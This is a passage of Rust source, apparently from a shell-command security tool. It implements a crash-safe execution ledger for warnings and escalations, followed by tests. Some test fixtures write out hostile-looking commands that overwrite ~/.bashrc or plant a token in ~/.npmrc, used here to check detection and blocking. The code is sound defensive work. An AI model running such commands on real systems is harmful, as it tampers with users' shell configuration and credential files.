        ensure_record_capacity(
            &mut ledger.unresolved,
            MAX_UNRESOLVED_EXECUTIONS,
            RecordCompaction::ExpiredOnly,
        )?;
    }
    ensure_new_history_capacity(ledger, draft, evidence.grade())?;
    let events = materialize_draft_events(ledger, draft, evidence.grade())?;
    let (warning_events, escalation_events) = materialize_draft_history(draft);
    let (generation, ledger_sequence) = advance_ledger(ledger)?;
    let committed_unix_ms = unix_time_ms()?;
    let record = ExecutionLedgerRecord {
        execution_id: draft.execution_id.clone(),
        draft_identity_sha256: draft.draft_identity_sha256.clone(),
        command_sha256: draft.command_sha256.clone(),
        command_redacted_preview: draft.command_redacted_preview.clone(),
        policy_basis_sha256: draft.decision.policy_basis_sha256.clone(),
        verdict_basis_sha256: draft.decision.verdict_basis_sha256.clone(),
        evidence_id: evidence.evidence_id.clone(),
        evidence_grade: evidence.grade(),
        evidence_history: vec![EvidenceTransition {
            evidence_id: evidence.evidence_id.clone(),
            grade: evidence.grade(),
            observed_unix_ms: committed_unix_ms,
            ledger_sequence,
            generation,
        }],
        committed_unix_ms,
        retention_until_unix_ms: draft.retention_until_unix_ms,
        ledger_sequence,
        generation,
        warning_events,
        escalation_events,
        events,
    };
    if evidence.grade().is_confirmed() {
        ledger.confirmed.push_back(record);
    } else {
        ledger.unresolved.push_back(record);
    }
    validate_execution_ledger(ledger, draft.session_id())?;
    Ok(PromotionOutcome::Committed { generation })
}

fn prune_expired_security_history(
    ledger: &mut ExecutionLedger,
    draft: &ExecutionDraft,
) -> Result<(), String> {
    let now = unix_time_ms()?;
    let legacy_cutoff = now.saturating_sub(policy_history_retention_ms(&draft.correlation_policy));
    ledger.legacy_warning_events.retain(|event| {
        chrono::DateTime::parse_from_rfc3339(&event.timestamp)
            .ok()
            .and_then(|timestamp| u64::try_from(timestamp.timestamp_millis()).ok())
            .is_some_and(|timestamp| timestamp >= legacy_cutoff)
    });
    ledger.legacy_typed_events.retain(|event| {
        chrono::DateTime::parse_from_rfc3339(&event.timestamp)
            .ok()
            .and_then(|timestamp| u64::try_from(timestamp.timestamp_millis()).ok())
            .is_some_and(|timestamp| timestamp >= legacy_cutoff)
    });
    for record in ledger
        .confirmed
        .iter_mut()
        .chain(ledger.unresolved.iter_mut())
    {
        if record.retention_until_unix_ms < now {
            record.warning_events.clear();
            record.escalation_events.clear();
            record.events.clear();
        }
    }
    Ok(())
}

fn ensure_new_history_capacity(
    ledger: &ExecutionLedger,
    draft: &ExecutionDraft,
    grade: ExecutionEvidenceGrade,
) -> Result<(), String> {
    let records = ledger.confirmed.iter().chain(ledger.unresolved.iter());
    let warning_count = ledger.legacy_warning_events.len()
        + records
            .clone()
            .map(|record| record.warning_events.len())
            .sum::<usize>()
        + draft.warning_prototypes.len();
    let event_count = ledger.legacy_typed_events.len()
        + records
            .clone()
            .map(|record| record.events.len())
            .sum::<usize>()
        + draft.provisional_events.len();
    let escalation_count = ledger
        .confirmed
        .iter()
        .map(|record| record.escalation_events.len())
        .sum::<usize>()
        + if grade.is_confirmed() {
            draft.escalation_hits.len()
        } else {
            0
        };
    if warning_count > crate::session_warnings::MAX_EVENTS
        || event_count > crate::session_warnings::MAX_TYPED_EVENTS
        || escalation_count > crate::session_warnings::MAX_ESCALATION_EVENTS
    {
        return Err("strict live security-history capacity is exhausted".to_string());
    }
    Ok(())
}

#[derive(Clone, Copy)]
enum RecordCompaction {
    ExpiredOnly,
    CleanGatewayCompletions,
}

fn ensure_record_capacity(
    records: &mut std::collections::VecDeque<ExecutionLedgerRecord>,
    cap: usize,
    compaction: RecordCompaction,
) -> Result<(), String> {
    let now = unix_time_ms()?;
    // Scan the whole deque only under capacity pressure. Sequence order does
    // not imply retention order when policies change, so pruning only an
    // expired front record can cause a deterministic outage with other expired
    // entries later in the deque. Below the cap, unresolved identities remain
    // available for an in-memory continuation whose configured completion
    // window may be longer than the policy correlation window.
    if records.len() >= cap {
        records.retain(|record| record.retention_until_unix_ms >= now);
    }
    while records.len() >= cap {
        let removable = match compaction {
            RecordCompaction::ExpiredOnly => None,
            RecordCompaction::CleanGatewayCompletions => records.iter().position(|record| {
                record.evidence_grade == ExecutionEvidenceGrade::GatewayCompleted
                    && record.warning_events.is_empty()
                    && record.escalation_events.is_empty()
                    && record.events.is_empty()
            }),
        };
        let Some(index) = removable else {
            return Err("strict execution ledger is full of live security-bearing correlation evidence; refusing to evict it".to_string());
        };
        if records.remove(index).is_none() {
            return Err("strict execution ledger compaction lost its selected record".to_string());
        }
    }
    Ok(())
}

fn advance_ledger(ledger: &mut ExecutionLedger) -> Result<(u64, u64), String> {
    let ledger_sequence = ledger.next_sequence;
    let generation = ledger
        .generation
        .checked_add(1)
        .ok_or_else(|| "execution ledger generation is exhausted".to_string())?;
    let next_sequence = ledger_sequence
        .checked_add(1)
        .ok_or_else(|| "execution ledger sequence space is exhausted".to_string())?;
    ledger.generation = generation;
    ledger.next_sequence = next_sequence;
    Ok((generation, ledger_sequence))
}

fn next_free_sequence(used: &std::collections::HashSet<u64>, start: u64) -> Option<u64> {
    let mut candidate = start.max(1);
    for _ in 0..=used.len() {
        if !used.contains(&candidate) {
            return Some(candidate);
        }
        candidate = candidate.checked_add(1)?;
    }
    None
}

fn materialize_draft_events(
    ledger: &mut ExecutionLedger,
    draft: &ExecutionDraft,
    evidence_grade: ExecutionEvidenceGrade,
) -> Result<Vec<crate::event_buffer::TypedEvent>, String> {
    if draft.provisional_events().is_empty() {
        return Ok(Vec::new());
    }
    let mut used: std::collections::HashSet<u64> = ledger
        .legacy_typed_events
        .iter()
        .chain(
            ledger
                .confirmed
                .iter()
                .chain(ledger.unresolved.iter())
                .flat_map(|record| record.events.iter()),
        )
        .map(|event| event.sequence)
        .filter(|sequence| *sequence != 0)
        .collect();
    let mut next = next_free_sequence(&used, ledger.next_event_sequence)
        .ok_or_else(|| "typed-event sequence space is exhausted".to_string())?;
    let timestamp = chrono::Utc::now().to_rfc3339();
    let mut events = Vec::with_capacity(draft.provisional_events().len());
    for (index, prototype) in draft.provisional_events().iter().cloned().enumerate() {
        let sequence = next;
        let event_id = format!("event-{}-{index}-{sequence}", draft.execution_id());
        let provenance = if evidence_grade.is_confirmed() {
            crate::event_buffer::EventProvenance::Confirmed
        } else {
            crate::event_buffer::EventProvenance::Unresolved
        };
        events.push(prototype.materialize(event_id, sequence, timestamp.clone(), provenance));
        used.insert(sequence);
        let start = sequence
            .checked_add(1)
            .ok_or_else(|| "typed-event sequence space is exhausted".to_string())?;
        next = next_free_sequence(&used, start)
            .ok_or_else(|| "typed-event sequence space is exhausted".to_string())?;
    }
    ledger.next_event_sequence = next;
    Ok(events)
}

fn materialize_draft_history(
    draft: &ExecutionDraft,
) -> (
    Vec<crate::session_warnings::WarningEvent>,
    Vec<crate::session_warnings::EscalationEvent>,
) {
    let timestamp = chrono::Utc::now().to_rfc3339();
    let warning_events = draft
        .warning_prototypes
        .iter()
        .map(|prototype| crate::session_warnings::WarningEvent {
            timestamp: timestamp.clone(),
            rule_id: prototype.rule_id.clone(),
            severity: prototype.severity.clone(),
            title: prototype.title.clone(),
            command_redacted: draft.command_redacted_preview.clone(),
            domains: prototype.domains.clone(),
        })
        .collect();
    let escalation_events = draft
        .escalation_hits
        .iter()
        .map(|hit| crate::session_warnings::EscalationEvent {
            timestamp: timestamp.clone(),
            rule_id: hit.rule_id.clone(),
            domain: hit.domain.clone(),
        })
        .collect();
    (warning_events, escalation_events)
}

#[cfg(unix)]
fn strict_state_path(directory: &Path, session_id: &str) -> PathBuf {
    directory.join(format!("{session_id}.execution"))
}

#[cfg(unix)]
fn cleanup_failed_strict_state_initialization(
    path: &Path,
    created: &File,
    created_identity: FileIdentity,
) -> Result<(), String> {
    if secure_regular_identity(created, "failed strict execution state")? != created_identity {
        return Err(
            "created strict execution state changed descriptor identity before cleanup".to_string(),
        );
    }
    if path_identity(path, "failed strict execution state")? != created_identity {
        return Err(
            "created strict execution state path was replaced; refusing to remove the replacement"
                .to_string(),
        );
    }
    // Keep the exact created inode open through unlink. The path identity check
    // binds cleanup to that inode; a replacement is retained fail-closed.
    fs::remove_file(path)
        .map_err(|error| format!("remove failed strict execution state: {error}"))?;
    crate::util::fsync_parent_dir(path)
        .map_err(|error| format!("durably remove failed strict execution state: {error}"))
}

#[cfg(unix)]
fn compose_strict_initialization_failure(
    initialization_error: String,
    cleanup: Result<(), String>,
) -> String {
    match cleanup {
        Ok(()) => initialization_error,
        Err(cleanup_error) => {
            format!("{initialization_error}; strict-state cleanup failed: {cleanup_error}")
        }
    }
}

#[cfg(unix)]
fn open_or_initialize_strict_state(
    directory: &Path,
    session_id: &str,
    legacy_session: Option<&crate::session_warnings::SessionWarnings>,
    legacy_source_sha256: Option<&str>,
) -> Result<(File, ExecutionLedger, usize, PathBuf, FileIdentity), String> {
    use std::os::unix::fs::OpenOptionsExt as _;

    let path = strict_state_path(directory, session_id);
    let mut options = OpenOptions::new();
    options
        .read(true)
        .write(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
    let mut file = match options.open(&path) {
        Ok(file) => file,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            let session = legacy_session.ok_or_else(|| {
                "strict execution state disappeared after preparation; refusing to recreate it without a locked legacy snapshot"
                    .to_string()
            })?;
            let mut ledger = ExecutionLedger::new(
                session_id,
                Some(session),
                legacy_source_sha256.map(str::to_string),
            )?;
            let after_legacy = session
                .typed_events
                .iter()
                .map(|event| event.sequence)
                .max()
                .unwrap_or(0)
                .checked_add(1)
                .ok_or_else(|| "legacy typed-event sequence space is exhausted".to_string())?;
            ledger.next_event_sequence = session.next_typed_event_sequence.max(after_legacy).max(1);
            validate_execution_ledger(&ledger, session_id)?;
            let initial_payload = serde_json::to_vec(&ledger)
                .map_err(|error| format!("serialize initial strict execution ledger: {error}"))?;
            if initial_payload.is_empty() || initial_payload.len() > STRICT_STATE_PAYLOAD_CAP {
                return Err(
                    "initial strict execution ledger exceeds its fixed slot cap".to_string()
                );
            }
            let mut create = OpenOptions::new();
            create
                .read(true)
                .write(true)
                .create_new(true)
                .mode(0o600)
                .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
            let mut created = create
                .open(&path)
                .map_err(|error| format!("create strict execution state: {error}"))?;
            let created_identity = secure_regular_identity(&created, "new strict execution state")?;
            if path_identity(&path, "new strict execution state")? != created_identity {
                return Err(
                    "new strict execution state path changed immediately after creation"
                        .to_string(),
                );
            }
            let initialized = (|| {
                created
                    .set_len(STRICT_STATE_FILE_SIZE)
                    .map_err(|error| format!("size strict execution state slots: {error}"))?;
                write_slot_frame(&mut created, 0, &ledger)?;
                write_slot_frame(&mut created, 1, &ledger)?;
                created
                    .sync_all()
                    .map_err(|error| format!("sync initialized strict execution state: {error}"))?;
                crate::util::fsync_parent_dir(&path)
                    .map_err(|error| format!("durably create strict execution state: {error}"))
            })();
            if let Err(error) = initialized {
                let cleanup =
                    cleanup_failed_strict_state_initialization(&path, &created, created_identity);
                drop(created);
                return Err(compose_strict_initialization_failure(error, cleanup));
            }
            created
        }
        Err(error) => return Err(format!("open strict execution state: {error}")),
    };
    let identity = secure_regular_identity(&file, "strict execution state")?;
    let metadata = file
        .metadata()
        .map_err(|error| format!("inspect strict execution state size: {error}"))?;
    if metadata.len() != STRICT_STATE_FILE_SIZE {
        return Err("strict execution state has an invalid fixed-slot size".to_string());
    }
    let left = read_slot_frame(&mut file, 0)?;
    let right = read_slot_frame(&mut file, 1)?;
    for ledger in left.iter().chain(right.iter()) {
        if ledger.schema_version != EXECUTION_LEDGER_SCHEMA_VERSION {
            return Err(format!(
                "unsupported checksum-valid strict execution schema {}",
                ledger.schema_version
            ));
        }
    }
    let left = left.filter(|ledger| validate_execution_ledger(ledger, session_id).is_ok());
    let right = right.filter(|ledger| validate_execution_ledger(ledger, session_id).is_ok());
    let (ledger, active_slot) = match (left, right) {
        (Some(left), Some(right)) if left.generation > right.generation => (left, 0),
        (Some(left), Some(right)) if right.generation > left.generation => (right, 1),
        (Some(left), Some(right)) if left == right => (left, 0),
        (Some(_), Some(_)) => {
            return Err("strict execution slots disagree at the same generation".to_string())
        }
        (Some(ledger), None) => (ledger, 0),
        (None, Some(ledger)) => (ledger, 1),
        (None, None) => return Err("both strict execution slots are corrupt".to_string()),
    };
    if path_identity(&path, "strict execution state")? != identity {
        return Err("strict execution state path was replaced while reading it".to_string());
    }
    Ok((file, ledger, active_slot, path, identity))
}

#[cfg(unix)]
fn read_slot_frame(file: &mut File, slot: usize) -> Result<Option<ExecutionLedger>, String> {
    let offset = (slot as u64)
        .checked_mul(STRICT_STATE_SLOT_SIZE)
        .ok_or_else(|| "strict execution slot offset overflowed".to_string())?;
    file.seek(SeekFrom::Start(offset))
        .map_err(|error| format!("seek strict execution slot: {error}"))?;
    let mut magic = [0u8; 8];
    file.read_exact(&mut magic)
        .map_err(|error| format!("read strict execution slot magic: {error}"))?;
    if &magic != STRICT_STATE_MAGIC {
        return Ok(None);
    }
    let mut length = [0u8; 8];
    let mut expected_digest = [0u8; 32];
    file.read_exact(&mut length)
        .map_err(|error| format!("read strict execution slot length: {error}"))?;
    file.read_exact(&mut expected_digest)
        .map_err(|error| format!("read strict execution slot digest: {error}"))?;
    let length = u64::from_le_bytes(length);
    if length == 0 || length > STRICT_STATE_PAYLOAD_CAP as u64 {
        return Ok(None);
    }
    let mut payload = vec![0u8; length as usize];
    file.read_exact(&mut payload)
        .map_err(|error| format!("read strict execution slot payload: {error}"))?;
    let actual_digest: [u8; 32] = Sha256::digest(&payload).into();
    if actual_digest != expected_digest {
        return Ok(None);
    }
    Ok(serde_json::from_slice(&payload).ok())
}

#[cfg(unix)]
fn write_slot_frame(file: &mut File, slot: usize, ledger: &ExecutionLedger) -> Result<(), String> {
    let payload = serde_json::to_vec(ledger)
        .map_err(|error| format!("serialize strict execution ledger: {error}"))?;
    if payload.is_empty() || payload.len() > STRICT_STATE_PAYLOAD_CAP {
        return Err("strict execution ledger exceeds its fixed slot cap".to_string());
    }
    let offset = (slot as u64)
        .checked_mul(STRICT_STATE_SLOT_SIZE)
        .ok_or_else(|| "strict execution slot offset overflowed".to_string())?;
    // Invalidate the inactive slot before replacing its payload. The other slot
    // remains a complete prior generation throughout a torn/failed write.
    file.seek(SeekFrom::Start(offset))
        .map_err(|error| format!("seek strict execution slot invalidation: {error}"))?;
    file.write_all(&[0u8; 8])
        .map_err(|error| format!("invalidate strict execution slot: {error}"))?;
    file.seek(SeekFrom::Start(offset + STRICT_STATE_HEADER_LEN))
        .map_err(|error| format!("seek strict execution slot payload: {error}"))?;
    file.write_all(&payload)
        .map_err(|error| format!("write strict execution slot payload: {error}"))?;
    let digest: [u8; 32] = Sha256::digest(&payload).into();
    file.seek(SeekFrom::Start(offset + 8))
        .map_err(|error| format!("seek strict execution slot header: {error}"))?;
    file.write_all(&(payload.len() as u64).to_le_bytes())
        .and_then(|()| file.write_all(&digest))
        .map_err(|error| format!("write strict execution slot header: {error}"))?;
    file.seek(SeekFrom::Start(offset))
        .map_err(|error| format!("seek strict execution slot commit marker: {error}"))?;
    file.write_all(STRICT_STATE_MAGIC)
        .map_err(|error| format!("write strict execution slot commit marker: {error}"))?;
    Ok(())
}

#[cfg(unix)]
fn write_strict_state(
    file: &mut File,
    path: &Path,
    expected_identity: FileIdentity,
    active_slot: usize,
    ledger: &ExecutionLedger,
    failures: PublishFailureInjection,
) -> Result<usize, StrictPublicationError> {
    if path_identity(path, "strict execution state")
        .map_err(StrictPublicationError::NotCommitted)?
        != expected_identity
        || secure_regular_identity(file, "strict execution state")
            .map_err(StrictPublicationError::NotCommitted)?
            != expected_identity
    {
        return Err(StrictPublicationError::NotCommitted(
            "strict execution state path was replaced while locked".to_string(),
        ));
    }
    // The fixed-slot protocol has no rename or post-publication parent-fsync
    // boundary. Keep these injections as explicit guards so tests prove those
    // obsolete paths cannot accidentally authorize a launch.
    if failures.fail_rename || failures.fail_parent_sync {
        return Err(StrictPublicationError::NotCommitted(
            "injected obsolete strict-state publication failure".to_string(),
        ));
    }
    if failures.fail_write {
        return Err(StrictPublicationError::NotCommitted(
            "injected strict execution slot write failure".to_string(),
        ));
    }
    if failures.fail_sync {
        return Err(StrictPublicationError::NotCommitted(
            "injected strict execution slot sync failure".to_string(),
        ));
    }
    let target = if active_slot == 0 { 1 } else { 0 };
    if let Err(error) = write_slot_frame(file, target, ledger) {
        return Err(
            match invalidate_uncommitted_slot(file, target, failures.fail_recovery_sync) {
                Ok(()) => StrictPublicationError::NotCommitted(error),
                Err(recovery_error) => StrictPublicationError::CommitUnknown(format!(
                    "slot write failed ({error}) and invalidation failed ({recovery_error})"
                )),
            },
        );
    }
    let commit_sync = if failures.fail_commit_sync {
        Err(std::io::Error::other(
            "injected post-write strict execution sync failure",
        ))
    } else {
        file.sync_all()
    };
    if let Err(error) = commit_sync {
        // Best-effort invalidate the unacknowledged generation. Even if this
        // recovery sync also fails, callers receive an explicit error and never
        // resume/forward based on uncertain durability.
        return Err(
            match invalidate_uncommitted_slot(file, target, failures.fail_recovery_sync) {
                Ok(()) => StrictPublicationError::NotCommitted(format!(
                    "sync strict execution slot: {error}"
                )),
                Err(recovery_error) => StrictPublicationError::CommitUnknown(format!(
                    "sync failed ({error}) and invalidation failed ({recovery_error})"
                )),
            },
        );
    }
    let published = read_slot_frame(file, target)
        .map_err(|error| {
            StrictPublicationError::CommitUnknown(format!(
                "read durable strict execution slot: {error}"
            ))
        })?
        .ok_or_else(|| {
            StrictPublicationError::CommitUnknown(
                "published strict execution slot failed checksum validation".to_string(),
            )
        })?;
    if &published != ledger {
        return Err(StrictPublicationError::CommitUnknown(
            "published strict execution slot changed identity".to_string(),
        ));
    }
    Ok(target)
}

#[cfg(unix)]
fn invalidate_uncommitted_slot(
    file: &mut File,
    target: usize,
    fail_recovery_sync: bool,
) -> Result<(), std::io::Error> {
    let offset = target as u64 * STRICT_STATE_SLOT_SIZE;
    file.seek(SeekFrom::Start(offset))?;
    file.write_all(&[0u8; 8])?;
    if fail_recovery_sync {
        Err(std::io::Error::other(
            "injected strict execution invalidation sync failure",
        ))
    } else {
        file.sync_all()
    }
}

pub(crate) fn unix_time_ms() -> Result<u64, String> {
    let millis = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|_| "system clock is before the Unix epoch".to_string())?
        .as_millis();
    u64::try_from(millis).map_err(|_| "system clock is outside the supported range".to_string())
}

pub(crate) fn sha256_hex(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

fn validate_stable_id(kind: &str, value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > 128
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
    {
        return Err(format!("{kind} id is not a bounded opaque identifier"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Finding, RuleId, Severity, Timings, Verdict};
    use std::path::Path;

    struct StateEnv {
        previous: Option<std::ffi::OsString>,
    }

    impl StateEnv {
        fn install(path: &Path) -> Self {
            let previous = std::env::var_os("XDG_STATE_HOME");
            // SAFETY: every test using this helper holds TEST_ENV_LOCK until the
            // guard restores the process environment.
            unsafe { std::env::set_var("XDG_STATE_HOME", path) };
            Self { previous }
        }
    }

    impl Drop for StateEnv {
        fn drop(&mut self) {
            // SAFETY: the owning test still holds TEST_ENV_LOCK.
            unsafe {
                match self.previous.take() {
                    Some(value) => std::env::set_var("XDG_STATE_HOME", value),
                    None => std::env::remove_var("XDG_STATE_HOME"),
                }
            }
        }
    }

    fn isolated_state(test: impl FnOnce(&tempfile::TempDir)) {
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let temporary = tempfile::tempdir().expect("isolated state home");
        let _environment = StateEnv::install(temporary.path());
        test(&temporary);
    }

    fn allow_verdict() -> Verdict {
        Verdict {
            action: Action::Allow,
            findings: Vec::new(),
            tier_reached: 3,
            bypass_requested: false,
            bypass_honored: false,
            bypass_available: false,
            interactive_detected: false,
            policy_path_used: None,
            timings_ms: Timings::default(),
            urls_extracted_count: None,
            requires_approval: None,
            approval_timeout_secs: None,
            approval_fallback: None,
            approval_rule: None,
            approval_description: None,
            escalation_reason: None,
            agent_origin: None,
            manifest_allowed_match: None,
        }
    }

    fn warning_verdict(rule_id: RuleId) -> Verdict {
        let mut verdict = allow_verdict();
        verdict.action = Action::Warn;
        verdict.findings.push(Finding {
            rule_id,
            severity: Severity::High,
            title: "strict warning".to_string(),
            description: "strict warning fixture".to_string(),
            evidence: vec![Evidence::Url {
                raw: "https://risk.example/path".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        verdict
    }

    #[cfg(unix)]
    fn write_legacy_session(session: &crate::session_warnings::SessionWarnings) -> Vec<u8> {
        use std::os::unix::fs::PermissionsExt as _;

        let path = crate::session_warnings::session_state_path(&session.session_id)
            .expect("legacy session path");
        let parent = path.parent().expect("legacy session parent");
        fs::create_dir_all(parent).expect("create legacy session parent");
        fs::set_permissions(parent, fs::Permissions::from_mode(0o700))
            .expect("secure legacy session parent");
        let bytes = serde_json::to_vec(session).expect("serialize legacy session");
        fs::write(&path, &bytes).expect("write legacy session");
        fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
            .expect("secure legacy session");
        bytes
    }

    fn prepare(command: &str, session_id: &str) -> PreparedExecution {
        prepare_execution(
            &allow_verdict(),
            &Policy::default(),
            command,
            session_id,
            CallerContext::Cli,
            ShellType::Posix,
            Duration::from_secs(30),
            Duration::from_secs(1),
        )
        .expect("strict execution preparation")
    }

    fn prepare_gateway(command: &str, session_id: &str) -> PreparedExecution {
        prepare_execution(
            &allow_verdict(),
            &Policy::default(),
            command,
            session_id,
            CallerContext::Gateway,
            ShellType::Posix,
            Duration::from_secs(90),
            Duration::from_secs(1),
        )
        .expect("strict gateway execution preparation")
    }

    #[cfg(unix)]
    fn read_test_ledger(session_id: &str) -> ExecutionLedger {
        let session = crate::session_warnings::SessionWarnings::new(session_id);
        let state = crate::session_warnings::session_state_path(session_id).expect("state path");
        let (file, ledger, _, _, _) = open_or_initialize_strict_state(
            state.parent().expect("sessions directory"),
            session_id,
            Some(&session),
            None,
        )
        .expect("strict ledger");
        drop(file);
        ledger
    }

    #[test]
    fn evidence_grades_keep_unresolved_observations_out_of_confirmed_history() {
        assert!(ExecutionEvidenceGrade::KernelExecStop.is_confirmed());
        assert!(ExecutionEvidenceGrade::GatewayCompleted.is_confirmed());
        assert!(!ExecutionEvidenceGrade::ShellBoundaryUnresolved.is_confirmed());
        assert!(!ExecutionEvidenceGrade::GatewayForwardedUnresolved.is_confirmed());
    }

    #[test]
    fn stable_ids_reject_structural_or_unbounded_input() {
        assert!(ExecutionEvidence::gateway_completed("exec_1", "gateway-response_1").is_ok());
        assert!(ExecutionEvidence::kernel_exec_stop("../exec", "evidence").is_err());
        assert!(ExecutionEvidence::kernel_exec_stop("exec", "x".repeat(129)).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn runner_confirmation_resolves_strict_warn_only_for_the_displayed_warning_set() {
        isolated_state(|_| {
            let session_id = "runner_strict_warn_ack";
            let policy = Policy {
                strict_warn: true,
                ..Policy::default()
            };
            let mut raw = warning_verdict(RuleId::DotfileOverwrite);
            raw.findings[0].severity = Severity::Medium;

            let unacknowledged = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("strict warning preparation");
            assert!(unacknowledged.requires_warn_ack());
            assert!(unacknowledged.into_authorizable_draft().is_err());

            let prepared = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("fresh strict warning preparation");
            let displayed = prepared.verdict().clone();
            let acknowledged = prepared
                .bind_runner_confirmation(&displayed, true)
                .expect("core binds the explicit runner acknowledgement");
            assert!(acknowledged.into_authorizable_draft().is_ok());

            let changed = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("changed-warning preparation");
            let mut different_display = displayed;
            different_display.findings[0].title.push_str(" changed");
            let error = changed
                .bind_runner_confirmation(&different_display, true)
                .expect_err("an acknowledgement of different warnings must not authorize");
            assert!(error.contains("warnings changed"), "{error}");

            let ledger = read_test_ledger(session_id);
            assert!(ledger.confirmed.is_empty() && ledger.unresolved.is_empty());
        });
    }

    #[cfg(unix)]
    #[test]
    fn runner_bypass_is_recomputed_from_the_final_strict_verdict() {
        isolated_state(|_| {
            let mut raw = warning_verdict(RuleId::DotfileOverwrite);
            raw.action = Action::Block;
            raw.findings[0].severity = Severity::High;
            // A stale preview may have carried contradictory bypass flags. The
            // trusted finalization seam must derive the honored fact anew.
            raw.bypass_requested = true;
            raw.bypass_available = true;
            raw.bypass_honored = false;
            let prepared = prepare_execution(
                &raw,
                &Policy::default(),
                "echo reviewed > ~/.bashrc",
                "runner_final_bypass",
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("strict blocking preparation");
            assert_eq!(prepared.verdict().action, Action::Block);
            let (prepared, honored) = prepared
                .reapply_runner_bypass(true, true)
                .expect("reapply trusted final bypass");
            assert!(honored);
            assert!(prepared.verdict().bypass_honored);
            assert!(
                prepared.into_authorizable_draft().is_ok(),
                "the rebuilt final draft carries the audited bypass fact"
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn read_only_preview_cancel_and_threshold_two_materialize_only_after_evidence() {
        isolated_state(|_| {
            let rule_id = RuleId::DotfileOverwrite;
            let mut raw = warning_verdict(rule_id);
            raw.findings[0].severity = Severity::Medium;
            let policy = Policy {
                escalation: vec![crate::escalation::EscalationRule::RepeatCount {
                    rule_ids: vec![rule_id.to_string()],
                    threshold: 2,
                    window_minutes: 60,
                    action: crate::escalation::EscalationAction::Block,
                    domain_scoped: false,
                    cooldown_minutes: 0,
                }],
                ..Policy::default()
            };

            let cancelled_session = "runner_cancel_threshold_two";
            let preview = crate::escalation::post_process_verdict_for_verification(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                cancelled_session,
                CallerContext::Cli,
            );
            assert_eq!(preview.action, Action::Warn);
            assert!(
                !crate::session_warnings::session_state_path(cancelled_session)
                    .expect("warning path")
                    .exists(),
                "a preview/cancel must not create best-effort warning history"
            );
            let after_cancel = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                cancelled_session,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("first decision after cancellation");
            assert_eq!(after_cancel.verdict().action, Action::Warn);
            drop(after_cancel);
            let retry = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                cancelled_session,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("cancelled decision is not history");
            assert_eq!(retry.verdict().action, Action::Warn);
            let cancelled_ledger = read_test_ledger(cancelled_session);
            assert!(cancelled_ledger.confirmed.is_empty());
            assert!(cancelled_ledger.unresolved.is_empty());

            let executed_session = "runner_execute_threshold_two";
            let stale_display = crate::escalation::post_process_verdict_for_verification(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                executed_session,
                CallerContext::Cli,
            );
            assert_eq!(
                stale_display.action,
                Action::Warn,
                "the pending confirmation initially displays the first warning"
            );
            let first = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                executed_session,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("first threshold-two decision");
            assert_eq!(first.verdict().action, Action::Warn);
            let gate = ExecutionGate::acquire(
                first.into_authorizable_draft().expect("warning draft"),
                Duration::from_secs(1),
            )
            .expect("first warning gate");
            gate.promote_kernel_exec_stop("runner-threshold-proof")
                .expect("evidence-backed warning promotion");

            // This preparation models the mandatory post-confirmation replay:
            // only strict session history changed while the original warning
            // was displayed, so the fresh threshold-two verdict must control.
            let second = prepare_execution(
                &raw,
                &policy,
                "echo reviewed > ~/.bashrc",
                executed_session,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("second threshold-two decision");
            assert_eq!(second.verdict().action, Action::Block);
            let ledger = read_test_ledger(executed_session);
            assert_eq!(ledger.confirmed.len(), 1);
            assert_eq!(ledger.confirmed[0].warning_events.len(), 1);
        });
    }

    #[cfg(unix)]
    #[test]
    fn strict_promotion_is_durable_and_separate_from_warning_json() {
        isolated_state(|_| {
            let prepared = prepare("printf 'TOKEN=x' > ~/.npmrc", "strict_separate");
            assert_eq!(prepared.verdict().action, Action::Allow);
            let draft = prepared
                .into_authorizable_draft()
                .expect("no interaction required");
            let gate = ExecutionGate::acquire(draft, Duration::from_secs(1))
                .expect("strict execution gate");
            let outcome = gate
                .promote_kernel_exec_stop("ptrace-stop-1")
                .expect("durable kernel promotion");
            assert_eq!(outcome, PromotionOutcome::Committed { generation: 1 });

            let ledger = read_test_ledger("strict_separate");
            assert_eq!(ledger.confirmed.len(), 1);
            assert!(ledger.unresolved.is_empty());
            assert_eq!(ledger.confirmed[0].events.len(), 1);
            assert_eq!(
                ledger.confirmed[0].events[0].kind,
                crate::event_buffer::EventKind::SecretWrite
            );
